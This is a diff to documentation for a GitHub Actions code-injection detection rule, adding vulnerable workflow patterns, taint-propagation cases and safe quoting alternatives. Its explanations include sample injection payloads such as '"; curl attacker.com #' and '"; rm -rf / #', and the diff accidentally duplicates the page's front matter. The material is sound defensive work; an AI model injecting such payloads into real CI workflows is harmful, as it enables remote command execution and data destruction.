@@ -1,6 +1,11 @@
 ---
 title: "Code Injection Rule (Critical)"
 weight: 9
+---
+
+---
+title: "Code Injection Rule (Critical)"
+weight: 9
 # bookFlatSection: false
 # bookToc: true
 # bookHidden: false
@@ -366,13 +371,93 @@ The code-injection-critical rule detects:
      echo "${{ github.event.pull_request.body }}"
    ```
 
+4. **Unquoted environment variables containing untrusted input**:
+   ```yaml
+   env:
+     PR_TITLE: ${{ github.event.pull_request.title }}
+   run: echo $PR_TITLE  # Missing quotes!
+   ```
+
+5. **eval with untrusted input (even when quoted)**:
+   ```yaml
+   env:
+     CMD: ${{ github.event.comment.body }}
+   run: eval "echo $CMD"  # Dangerous even with quotes!
+   ```
+
+6. **sh -c / bash -c with untrusted input**:
+   ```yaml
+   env:
+     BODY: ${{ github.event.pull_request.body }}
+   run: sh -c "process $BODY"  # Creates nested shell parsing
+   ```
+
+7. **Command substitution with untrusted input**:
+   ```yaml
+   env:
+     TITLE: ${{ github.event.pull_request.title }}
+   run: result=$(echo $TITLE)  # Untrusted input in subshell
+   ```
+
+8. **Taint propagation via step outputs (GHSL-2024-325 pattern)**:
+   ```yaml
+   # Step 1: Untrusted input written to $GITHUB_OUTPUT
+   - id: get-ref
+     run: echo "ref=${{ github.event.comment.body }}" >> $GITHUB_OUTPUT
+
+   # Step 2: Tainted output used in env variable
+   - env:
+       BRANCH: ${{ steps.get-ref.outputs.ref }}  # Tainted!
+     run: git push origin HEAD:${BRANCH}  # Detected as code injection
+   ```
+
+   This pattern tracks taint propagation through:
+   - Direct writes: `echo "name=${{ untrusted }}" >> $GITHUB_OUTPUT`
+   - Variable propagation: `VAR="${{ untrusted }}"; echo "name=$VAR" >> $GITHUB_OUTPUT`
+   - Heredoc patterns: `cat <<EOF >> $GITHUB_OUTPUT`
+
+9. **Multi-hop taint propagation (step output to step output)**:
+   ```yaml
+   # Step A: Write untrusted input to output
+   - id: step-a
+     run: echo "val=${{ github.head_ref }}" >> $GITHUB_OUTPUT
+
+   # Step B: Read from Step A, write to own output - taint propagates
+   - id: step-b
+     env:
+       INPUT: ${{ steps.step-a.outputs.val }}
+     run: echo "derived=$INPUT" >> $GITHUB_OUTPUT  # Also tainted!
+
+   # Step C: Use Step B's output - still tainted
+   - env:
+       FINAL: ${{ steps.step-b.outputs.derived }}  # Tainted via step-b -> step-a
+     run: echo $FINAL  # Detected as code injection
+   ```
+
+10. **Known tainted action outputs**:
+    ```yaml
+    # gotson/pull-request-comment-branch exposes untrusted PR data
+    - uses: gotson/pull-request-comment-branch@v1
+      id: comment-branch
+
+    - env:
+        BRANCH_NAME: ${{ steps.comment-branch.outputs.head_ref }}  # Tainted!
+      run: |
+        git push origin HEAD:${BRANCH_NAME}  # Detected as code injection
+    ```
+
+    Known tainted actions include:
+    - `gotson/pull-request-comment-branch` - exposes `head_ref`, `head_sha`, `base_ref`, `base_sha`
+    - `xt0rted/pull-request-comment-branch` - same outputs as above
+    - `peter-evans/find-comment` - exposes `comment-body`, `comment-author`
+
 ### Safe Patterns
 
 The rule recognizes these patterns as safe:
 
-1. **Environment variables**:
+1. **Properly quoted environment variables**:
    ```yaml
-   run: echo "$PR_TITLE"
+   run: echo "$PR_TITLE"  # Double quotes prevent shell metacharacter attacks
    env:
      PR_TITLE: ${{ github.event.pull_request.title }}
    ```
@@ -382,6 +467,123 @@ The rule recognizes these patterns as safe:
    run: echo "${{ github.sha }}"  # Trusted
    run: echo "${{ github.repository }}"  # Trusted
    ```
+
+3. **Passing environment variables to subshells safely**:
+   ```yaml
+   env:
+     PR_TITLE: ${{ github.event.pull_request.title }}
+   run: |
+     export PR_TITLE
+     sh -c 'echo "$PR_TITLE"'  # Single quotes prevent expansion in outer shell
+   ```
+
+4. **Using printf for safer output**:
+   ```yaml
+   env:
+     PR_TITLE: ${{ github.event.pull_request.title }}
+   run: printf '%s\n' "$PR_TITLE"  # printf with %s is safer than echo
+   ```
+
+5. **Step outputs from trusted inputs** (not flagged for taint propagation):
+   ```yaml
+   # github.sha is trusted, so the output is not tainted
+   - id: get-sha
+     run: echo "sha=${{ github.sha }}" >> $GITHUB_OUTPUT
+
+   - env:
+       COMMIT: ${{ steps.get-sha.outputs.sha }}  # Safe - not tainted
+     run: git checkout "$COMMIT"
+   ```
+
+### Shell Metacharacter Injection
+
+Even when using environment variables (which is the recommended practice), improper shell handling can still lead to injection vulnerabilities. The rule detects several dangerous patterns:
+
+#### Unquoted Variables
+
+**Vulnerable:**
+```yaml
+env:
+  PR_TITLE: ${{ github.event.pull_request.title }}
+run: echo $PR_TITLE
+```
+
+Without quotes, the shell performs word splitting and glob expansion. An attacker could use:
+- `* /etc/passwd` - glob expansion to list files
+- `$(malicious_command)` - command substitution
+
+**Safe:**
+```yaml
+env:
+  PR_TITLE: ${{ github.event.pull_request.title }}
+run: echo "$PR_TITLE"  # Double quotes prevent expansion
+```
+
+#### eval Command
+
+**Vulnerable:**
+```yaml
+env:
+  CMD: ${{ github.event.comment.body }}
+run: eval "echo $CMD"
+```
+
+Even with quotes, `eval` parses the string again, enabling:
+- `"; curl attacker.com #` - break out and execute arbitrary commands
+
+**Safe Alternative:**
+```yaml
+env:
+  CMD: ${{ github.event.comment.body }}
+run: |
+  # Use printf %q for proper escaping if eval is necessary
+  escaped=$(printf '%q' "$CMD")
+  # Or better, avoid eval entirely and use the variable directly
+  echo "$CMD"
+```
+
+#### Nested Shell Commands (sh -c, bash -c)
+
+**Vulnerable:**
+```yaml
+env:
+  BODY: ${{ github.event.pull_request.body }}
+run: sh -c "process $BODY"
+```
+
+Creates a new shell that parses the string again, vulnerable to:
+- `"; rm -rf / #` - command injection via quote escaping
+
+**Safe:**
+```yaml
+env:
+  BODY: ${{ github.event.pull_request.body }}
+run: |
+  # Export the variable and use single quotes in the subshell
+  export BODY
+  sh -c 'echo "$BODY"'  # Single quotes prevent outer shell expansion
+```
+
+#### Command Substitution
+
+**Vulnerable:**
+```yaml
+env:
+  TITLE: ${{ github.event.pull_request.title }}
+run: result=$(grep $TITLE file.txt)
+```
+
+Unquoted variable in command substitution allows:
+- Glob expansion
+- Word splitting
+- Embedded command injection
+
+**Safe:**
+```yaml
+env:
+  TITLE: ${{ github.event.pull_request.title }}
+run: result=$(grep -F -- "$TITLE" file.txt)  # Quote and use -F for fixed strings
+```
 
 ### Difference from Medium Severity
 
@@ -450,7 +652,6 @@ This rule has minimal performance impact:
 **Industry References:**
 - [CodeQL: Code Injection (Critical)](https://codeql.github.com/codeql-query-help/actions/actions-code-injection-critical/) - CodeQL's detection pattern
 - [GitHub: Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions) - Official security guidance
-- [GitHub Security Lab: Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/) - Comprehensive guide to pwn request attacks
 - [OWASP: CICD-SEC-04 - PPE](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution) - Attack patterns
 - [CWE-94: Code Injection](https://cwe.mitre.org/data/definitions/94.html) - Vulnerability classification
 - [GitHub: Keeping Actions Secure](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions) - Action security best practices
@@ -458,8 +659,6 @@ This rule has minimal performance impact:
 {{< popup_link2 href="https://codeql.github.com/codeql-query-help/actions/actions-code-injection-critical/" >}}
 
 {{< popup_link2 href="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions" >}}
-
-{{< popup_link2 href="https://securitylab.github.com/research/github-actions-preventing-pwn-requests/" >}}
 
 {{< popup_link2 href="https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution" >}}
 
